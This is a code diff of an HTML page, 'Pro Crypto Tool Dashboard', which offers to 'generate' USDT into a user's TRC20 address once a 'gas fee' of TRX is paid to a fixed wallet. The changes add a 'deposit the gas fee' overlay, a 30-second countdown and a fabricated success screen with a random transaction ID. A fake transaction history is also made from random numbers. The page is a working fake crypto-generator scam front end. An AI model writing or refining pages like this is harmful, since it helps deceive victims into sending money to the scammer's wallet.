@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Pro Crypto Tool Dashboard</title>
-  <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
   <style>
     :root {
       --primary: #1efc1e;
@@ -13,16 +13,18 @@
       --bg: #090909;
       --panel-bg: #111;
       --panel-radius: 18px;
-      --shadow: 0 2px 16px rgba(30,252,30,.12);
+      --shadow: 0 2px 16px rgba(30, 252, 30, 0.12);
       --success: #0fda60;
       --error: #ff5050;
     }
-    * { box-sizing: border-box; }
+    * {
+      box-sizing: border-box;
+    }
     body {
       margin: 0;
       background: var(--bg);
       color: var(--primary);
-      font-family: 'VT323', monospace;
+      font-family: "VT323", monospace;
       min-height: 100vh;
     }
     .dashboard-wrapper {
@@ -44,13 +46,15 @@
     .dashboard-title {
       font-size: 2.7em;
       letter-spacing: 2px;
-      display: flex; align-items: center;
+      display: flex;
+      align-items: center;
       gap: 13px;
       color: var(--primary);
       text-shadow: 0 0 13px var(--primary);
     }
     .dashboard-actions {
-      display: flex; gap: 12px;
+      display: flex;
+      gap: 12px;
       align-items: center;
     }
     .action-btn {
@@ -62,17 +66,21 @@
       font-size: 1.14em;
       cursor: pointer;
       font-weight: bold;
-      transition: all .15s;
+      transition: all 0.15s;
     }
-    .action-btn.active, .action-btn:hover {
+    .action-btn.active,
+    .action-btn:hover {
       background: var(--primary);
       color: var(--bg);
       box-shadow: 0 0 9px var(--primary);
     }
     /* Panels */
     .panel-group {
-      display: flex; gap: 24px; flex-wrap: wrap;
-      justify-content: space-between; margin-bottom: 13px;
+      display: flex;
+      gap: 24px;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      margin-bottom: 13px;
     }
     .card-panel {
       flex: 1 1 340px;
@@ -83,35 +91,56 @@
       box-shadow: var(--shadow);
       padding: 22px 18px;
       margin-bottom: 19px;
-      display: flex; flex-direction: column;
+      display: flex;
+      flex-direction: column;
+      position: relative;
     }
     .panel-title {
-      font-size: 1.28em; margin-bottom: 16px;
-      font-weight: bold; display: flex; align-items:center; gap:8px;
+      font-size: 1.28em;
+      margin-bottom: 16px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
     /* Form */
     .crypto-form label {
-      font-size: 1.04em; margin-bottom: 6px; display:block;
+      font-size: 1.04em;
+      margin-bottom: 6px;
+      display: block;
     }
-    .crypto-form input[type="text"], .crypto-form input[type="number"] {
-      width: 100%; margin-bottom: 11px;
+    .crypto-form input[type="text"],
+    .crypto-form input[type="number"] {
+      width: 100%;
+      margin-bottom: 11px;
       padding: 13px;
       border-radius: 7px;
-      background: var(--bg); color: var(--primary);
+      background: var(--bg);
+      color: var(--primary);
       border: 1.2px solid var(--primary);
       font-size: 1.09em;
-      transition: border .15s;
+      transition: border 0.15s;
     }
-    .crypto-form input:focus { border-color: #fff; }
+    .crypto-form input:focus {
+      border-color: #fff;
+    }
     .form-btn {
-      width: 100%; margin-top: 13px; padding: 17px 0;
-      font-size: 1.2em; border-radius: 8px;
-      background: var(--primary); color: var(--bg);
-      border: none; font-weight: bold; cursor:pointer;
+      width: 100%;
+      margin-top: 13px;
+      padding: 17px 0;
+      font-size: 1.2em;
+      border-radius: 8px;
+      background: var(--primary);
+      color: var(--bg);
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
       box-shadow: var(--shadow);
-      transition: .15s;
+      transition: 0.15s;
     }
-    .form-btn:active { background: #14fa14;}
+    .form-btn:active {
+      background: #14fa14;
+    }
     /* Info Cards */
     .card-summary {
       font-size: 1.1em;
@@ -123,53 +152,155 @@
       color: #fafafa;
       font-family: inherit;
     }
-    .card-summary i {font-size:1.05em; margin-right:7px;}
+    .card-summary i {
+      font-size: 1.05em;
+      margin-right: 7px;
+    }
     /* Transactions */
-    .transaction-list {margin-top: 3px;}
+    .transaction-list {
+      margin-top: 3px;
+    }
     .transaction-block {
       background: #191919;
       border-radius: 7px;
       box-shadow: 0 0 8px #15fd1597;
-      display: flex; justify-content: space-between; align-items: center;
-      padding: 15px 10px; margin-bottom: 7px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 10px;
+      margin-bottom: 7px;
       font-size: 1.07em;
     }
-    .transaction-info {display: flex; flex-direction:column;}
-    .transaction-id {font-weight: bold; margin-bottom: 3px;}
-    .transaction-amount {font-size:1.18em; color:#fff700;}
+    .transaction-info {
+      display: flex;
+      flex-direction: column;
+    }
+    .transaction-id {
+      font-weight: bold;
+      margin-bottom: 3px;
+      font-family: monospace;
+    }
+    .transaction-amount {
+      font-size: 1.18em;
+      color: #fff700;
+    }
     .transaction-status {
-      background: #001a00; color: var(--primary);
-      padding: 6px 16px; border-radius: 20px; font-size: .97em;
+      background: #001a00;
+      color: var(--primary);
+      padding: 6px 16px;
+      border-radius: 20px;
+      font-size: 0.97em;
       font-weight: bold;
       border: 1px solid var(--primary);
     }
-    .transaction-timestamp {color:#b5ffb5; font-size:.97em;}
+    .transaction-timestamp {
+      color: #b5ffb5;
+      font-size: 0.97em;
+    }
     /* Paging */
     .transactions-paging {
-      display: flex; gap: 9px; justify-content: center; margin-top: 4px; margin-bottom: 13px;
+      display: flex;
+      gap: 9px;
+      justify-content: center;
+      margin-top: 4px;
+      margin-bottom: 13px;
     }
     .transactions-paging button {
-      width: 59px; padding: 7px 0; font-size: 1.25em;
-      background: var(--bg); color: var(--primary); border: 1.5px solid var(--primary);
-      border-radius: 5px; cursor: pointer; font-family: inherit;
-      font-weight: bold; transition: .15s;
+      width: 59px;
+      padding: 7px 0;
+      font-size: 1.25em;
+      background: var(--bg);
+      color: var(--primary);
+      border: 1.5px solid var(--primary);
+      border-radius: 5px;
+      cursor: pointer;
+      font-family: inherit;
+      font-weight: bold;
+      transition: 0.15s;
     }
     .transactions-paging button.active,
     .transactions-paging button:focus {
-      background: var(--primary); color: var(--bg);
+      background: var(--primary);
+      color: var(--bg);
       box-shadow: 0 0 9px var(--primary);
     }
-    /* Responsive: Mobile Stack */
-    @media (max-width:900px){
-      .dashboard-header, .panel-group { flex-direction:column;}
-      .dashboard-title { font-size: 2em;}
+    /* Waiting & Success Overlays */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.92);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 9999;
+      color: var(--primary);
+      font-family: 'VT323', monospace;
     }
-    @media (max-width:600px){
-      .dashboard-wrapper, .dashboard-header, .card-panel {padding:8px;}
-      .panel-title{font-size:1.05em;}
-      .dashboard-title{font-size:1.3em;}
-      .action-btn {font-size:1em;padding:8px 14px;}
-      .form-btn {font-size:1em;}
+    .loading-spinner {
+      border: 5px solid #000;
+      border-top: 5px solid var(--primary);
+      border-radius: 50%;
+      width: 70px;
+      height: 70px;
+      animation: spin 1.2s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% {
+        transform: rotate(0);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+    .success-icon {
+      font-size: 4em;
+      margin-bottom: 18px;
+      color: #00ff00;
+      animation: bounce 1.4s infinite;
+    }
+    @keyframes bounce {
+      0%,
+      100% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(-13px);
+      }
+    }
+    /* Responsive: Mobile Stack */
+    @media (max-width: 900px) {
+      .dashboard-header,
+      .panel-group {
+        flex-direction: column;
+      }
+      .dashboard-title {
+        font-size: 2em;
+      }
+    }
+    @media (max-width: 600px) {
+      .dashboard-wrapper,
+      .dashboard-header,
+      .card-panel {
+        padding: 8px;
+      }
+      .panel-title {
+        font-size: 1.05em;
+      }
+      .dashboard-title {
+        font-size: 1.3em;
+      }
+      .action-btn {
+        font-size: 1em;
+        padding: 8px 14px;
+      }
+      .form-btn {
+        font-size: 1em;
+      }
     }
   </style>
 </head>
@@ -191,17 +322,17 @@
       <!-- Crypto Generator Form -->
       <div class="card-panel">
         <div class="panel-title"><i class="fa fa-credit-card"></i> Generate USDT</div>
-        <form class="crypto-form" onsubmit="generateUsdt();return false;">
+        <form class="crypto-form" id="usdtForm" onsubmit="handleGenerate(event)">
           <label for="usdt-address"><i class="fa fa-wallet"></i> USDT TRC20 Address</label>
-          <input type="text" id="usdt-address" placeholder="Enter TRC20 address" required>
+          <input type="text" id="usdt-address" placeholder="Enter TRC20 address" required />
           <label for="amount-input"><i class="fa fa-dollar-sign"></i> Amount (USDT)</label>
-          <input type="number" id="amount-input" placeholder="Enter amount (min 1000)" min="1000" max="500000">
+          <input type="number" id="amount-input" placeholder="Enter amount (min 1000)" min="1000" max="500000" />
           <button class="form-btn" type="submit"><i class="fa fa-bolt"></i> Generate</button>
         </form>
         <div class="card-summary">
           <i class="fa fa-info-circle"></i>
-          Gas Fee is <b>20 TRX</b> per 1,000 USDT.<br>
-          Gas Address: <span style="font-family:monospace;">TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA</span>
+          Gas Fee is <b>20 TRX</b> per 1,000 USDT.<br />
+          Gas Address: <span style="font-family: monospace">TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA</span>
         </div>
       </div>
       <!-- Recent Transactions -->
@@ -212,36 +343,73 @@
       </div>
     </div>
   </div>
+
+  <!-- Waiting overlay -->
+  <div class="overlay" id="waiting-overlay">
+    <div class="loading-spinner"></div>
+    <div>Please deposit the gas fee to the above address.</div>
+    <div id="countdown-timer" style="margin-top:15px; font-size: 1.4em; font-weight: bold;"></div>
+  </div>
+
+  <!-- Success overlay -->
+  <div class="overlay" id="success-overlay">
+    <div class="success-icon"><i class="fa fa-circle-check"></i></div>
+    <div style="font-size:1.2em; margin-bottom: 8px;">Transaction Successful!</div>
+    <div>
+      Amount: <span id="success-amount">0</span> USDT<br />
+      TXID: <span id="success-txid"></span><br />
+      Time: <span id="success-time"></span>
+    </div>
+    <button class="form-btn" style="margin-top:20px; max-width:200px;" onclick="closeSuccess()">New Transaction</button>
+  </div>
+
   <script>
-    // PAGINATED TRANSACTIONS
+    // Helper: Validate TRC20 address format
+    function validateAddress(address) {
+      return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address.trim());
+    }
+
+    // Helper: Get relative time string for recent txns
+    function getRelativeTime(offsetHours) {
+      const now = new Date();
+      now.setHours(now.getHours() - offsetHours);
+      return now.toLocaleString("en-US", {
+        month: "short",
+        day: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+      });
+    }
+
+    // Transaction vars for paging
     const TX_PER_PAGE = 5;
     let allTransactions = [];
     let currentPage = 1;
     let txPageCount = 1;
 
+    // Generate random transaction list
     function generateTransactionsList() {
-      const totalTx = 25; // 5 pages x 5 txns per page
+      const totalTx = 25;
       const txns = [];
       for (let i = 0; i < totalTx; i++) {
-        const amount = Math.floor(Math.random() * 499000) + 1000;
-        const hash = "TX" + Math.random().toString(36).substr(2, 12).toUpperCase();
-        const timestamp = getRelativeTime(Math.floor(i / 5));
         txns.push({
-          id: hash,
-          amount,
+          id: "TX" + Math.random().toString(36).substr(2, 12).toUpperCase(),
+          amount: Math.floor(Math.random() * 499000) + 1000,
           status: "completed",
-          timestamp,
+          timestamp: getRelativeTime(Math.floor(i / TX_PER_PAGE)),
         });
       }
       return txns;
     }
+
+    // Render paging controls
     function renderPagingControls() {
-      const paging = document.getElementById('transactions-paging');
-      paging.innerHTML = '';
+      const paging = document.getElementById("transactions-paging");
+      paging.innerHTML = "";
       for (let i = 1; i <= txPageCount; i++) {
-        const btn = document.createElement('button');
+        const btn = document.createElement("button");
         btn.textContent = i;
-        btn.className = (i === currentPage ? 'active' : '');
+        btn.className = i === currentPage ? "active" : "";
         btn.onclick = function () {
           currentPage = i;
           populateTransactions();
@@ -249,15 +417,17 @@
         paging.appendChild(btn);
       }
     }
+
+    // Populate transactions with paging
     function populateTransactions() {
-      const list = document.getElementById('transaction-list');
-      list.innerHTML = '';
+      const list = document.getElementById("transaction-list");
+      list.innerHTML = "";
       txPageCount = Math.ceil(allTransactions.length / TX_PER_PAGE);
       const start = (currentPage - 1) * TX_PER_PAGE;
       const txns = allTransactions.slice(start, start + TX_PER_PAGE);
       txns.forEach((tx) => {
-        const t = document.createElement('div');
-        t.className = 'transaction-block';
+        const t = document.createElement("div");
+        t.className = "transaction-block";
         t.innerHTML = `
           <div class="transaction-info">
             <div class="transaction-id">${tx.id}</div>
@@ -272,40 +442,81 @@
       });
       renderPagingControls();
     }
-    function getRelativeTime(offsetHours) {
-      const now = new Date(); now.setHours(now.getHours()-offsetHours);
-      return now.toLocaleString('en-US',{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
-    }
+
+    // Refresh transactions every 10 minutes
     function refreshTransactionsPeriodically() {
       allTransactions = generateTransactionsList();
       currentPage = 1;
       populateTransactions();
     }
-    document.addEventListener('DOMContentLoaded', function () {
-      refreshTransactionsPeriodically();
-      setInterval(refreshTransactionsPeriodically, 600000); // 10 min
-    });
 
-    // USDT Form Demo
-    function generateUsdt(){
-      const addressInput = document.getElementById('usdt-address');
-      const amountInput = document.getElementById('amount-input');
-      if (!addressInput.value.trim()) {
-        addressInput.style.borderColor = '#ff5050';
+    // Overlay variables and timers
+    const waitingOverlay = document.getElementById("waiting-overlay");
+    const successOverlay = document.getElementById("success-overlay");
+    const countdownTimer = document.getElementById("countdown-timer");
+    const successAmountElem = document.getElementById("success-amount");
+    const successTxidElem = document.getElementById("success-txid");
+    const successTimeElem = document.getElementById("success-time");
+
+    // Close success overlay (reset form)
+    function closeSuccess() {
+      successOverlay.style.display = "none";
+      document.getElementById("usdt-address").value = "";
+      document.getElementById("amount-input").value = "";
+    }
+
+    // Handle form submission (Generate button)
+    function handleGenerate(event) {
+      event.preventDefault();
+      const addressInput = document.getElementById("usdt-address");
+      const amountInput = document.getElementById("amount-input");
+
+      // Validate inputs
+      if (!validateAddress(addressInput.value.trim())) {
+        alert("Invalid USDT TRC20 address!");
         addressInput.focus();
         return;
       }
-      if (!amountInput.value || parseInt(amountInput.value) < 1000 || parseInt(amountInput.value) > 500000) {
-        amountInput.style.borderColor = '#ff5050';
+      const amount = parseInt(amountInput.value);
+      if (!amount || amount < 1000 || amount > 500000) {
+        alert("Enter a valid amount between 1,000 and 500,000 USDT!");
         amountInput.focus();
         return;
       }
-      alert("USDT Generation Request Sent!\nAddress: " + addressInput.value + "\nAmount: " + amountInput.value + " USDT");
-      addressInput.value = "";
-      amountInput.value = "";
-      addressInput.style.borderColor = "var(--primary)";
-      amountInput.style.borderColor = "var(--primary)";
+
+      // Show waiting overlay, start 30s countdown
+      waitingOverlay.style.display = "flex";
+      let countdown = 30;
+      countdownTimer.textContent = `Time remaining: ${countdown} s`;
+      const interval = setInterval(() => {
+        countdown--;
+        countdownTimer.textContent = `Time remaining: ${countdown} s`;
+        if (countdown <= 0) {
+          clearInterval(interval);
+          waitingOverlay.style.display = "none";
+
+          // Show success overlay with details
+          successAmountElem.textContent = amount.toLocaleString();
+          successTxidElem.textContent =
+            "TX" + Math.random().toString(36).substr(2, 16).toUpperCase();
+          successTimeElem.textContent = new Date().toLocaleString("en-US", {
+            month: "short",
+            day: "numeric",
+            hour: "2-digit",
+            minute: "2-digit",
+          });
+          successOverlay.style.display = "flex";
+
+          // Refresh transactions with new random data
+          refreshTransactionsPeriodically();
+        }
+      }, 1000);
     }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      refreshTransactionsPeriodically();
+      setInterval(refreshTransactionsPeriodically, 600000); // refresh every 10min
+    });
   </script>
 </body>
 </html>
